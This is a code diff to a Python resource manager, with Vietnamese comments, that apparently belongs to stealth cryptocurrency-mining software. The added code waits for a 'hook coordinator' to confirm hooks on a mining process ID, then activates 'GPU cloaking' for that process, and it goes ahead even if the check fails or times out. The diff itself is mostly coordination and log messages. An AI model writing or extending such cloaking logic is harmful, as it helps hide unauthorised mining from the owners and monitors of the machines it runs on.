@@ -525,13 +525,41 @@ class ResourceManager(IResourceManager):
         """
         🚀 **Immediate Cloaking Activation** (kích hoạt cloaking tức thì)
         
-        Kích hoạt GPU cloaking plugins ngay lập tức khi nhận được
-        real mining PID từ DirectPIDRegistry.
+        PHASE 3++: Enhanced với Hook Coordinator integration
+        Chờ PHASE 3+ completion trước khi activate cloaking.
         
         Args:
             mining_process: MiningProcess object cần apply cloaking
         """
         try:
+            # PHASE 3++: Check hook readiness trước khi activate cloaking
+            try:
+                import sys
+                import os
+                sys.path.insert(0, os.path.join(os.path.dirname(__file__), '..', 'coordination'))
+                from hook_coordinator import get_hook_coordinator
+                
+                coordinator = get_hook_coordinator()
+                pid = mining_process.pid
+                
+                self.logger.info(f"🔍 [PHASE3++] Checking hook readiness for PID {pid}")
+                
+                # Check if hooks are ready từ PHASE 3+ completion
+                if coordinator.check_hooks_ready(pid):
+                    self.logger.info(f"✅ [PHASE3++] Hooks ready for PID {pid} - proceeding immediately")
+                else:
+                    self.logger.info(f"⏳ [PHASE3++] Hooks not ready for PID {pid} - waiting...")
+                    
+                    # Wait for hooks với timeout
+                    if coordinator.wait_for_hooks_ready(pid, timeout=70):
+                        self.logger.info(f"✅ [PHASE3++] Hooks became ready for PID {pid} - proceeding")
+                    else:
+                        self.logger.warning(f"⏰ [PHASE3++] Timeout waiting for hooks PID {pid} - proceeding anyway")
+                        
+            except Exception as coord_err:
+                self.logger.error(f"❌ [PHASE3++] Hook Coordinator check failed: {coord_err}")
+                self.logger.info(f"🔄 [PHASE3++] Proceeding with cloaking activation anyway")
+            
             self.logger.info(f"🔒 [IMMEDIATE-CLOAKING] Starting immediate cloaking for PID {mining_process.pid}")
             
             # **Create high-priority cloaking task** (tạo nhiệm vụ cloaking ưu tiên cao)
